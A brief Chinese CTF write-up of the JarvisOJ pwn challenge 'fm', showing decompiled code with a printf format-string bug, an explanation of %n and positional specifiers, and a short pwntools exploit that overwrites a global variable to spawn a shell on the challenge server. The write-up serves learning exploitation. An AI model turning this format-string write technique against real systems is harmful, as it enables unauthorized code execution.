# jarvisoj--pwn--fm

由于昨天的格式化字符串题目对我来说不太懂，今天做题简单的

ida

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+2Ch] [ebp-5Ch]
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(&buf, 0, 0x50u);
  read(0, &buf, 0x50u);
  printf(&buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```

明显格式字符串漏洞，只需把x变为4，就可以getshell

```c++
.data:0804A02C                 public x
.data:0804A02C x               dd 3                    ; DATA XREF: main+65↑r
.data:0804A02C                                         ; main+7C↑r
.data:0804A02C _data           ends
```

x所在地址

## 原理学习

当格式化字符串中出现%n时，会把%n前已经打印出过字符的个数作为一个值写到对应参数（或地址）上

例子 printf("2333%n",&a);               a=4

格式化符的特殊用法：偏移量标志符$

 用法是：例如%5$n，意味在拓展这个%n对应的内容时，参数偏移量为5，即从栈中的格式化串指针处，往高地址偏移5个参数，再做参数向串中的拓展。
 
 字符串偏移 利用gdb 看 stack

exp：

```python
from pwn import *

r = remote("pwn2.jarvisoj.com",9895)
payload = p32(0x804a02c)+'%11$n'
r.sendline(payload)
r.interactive()
```

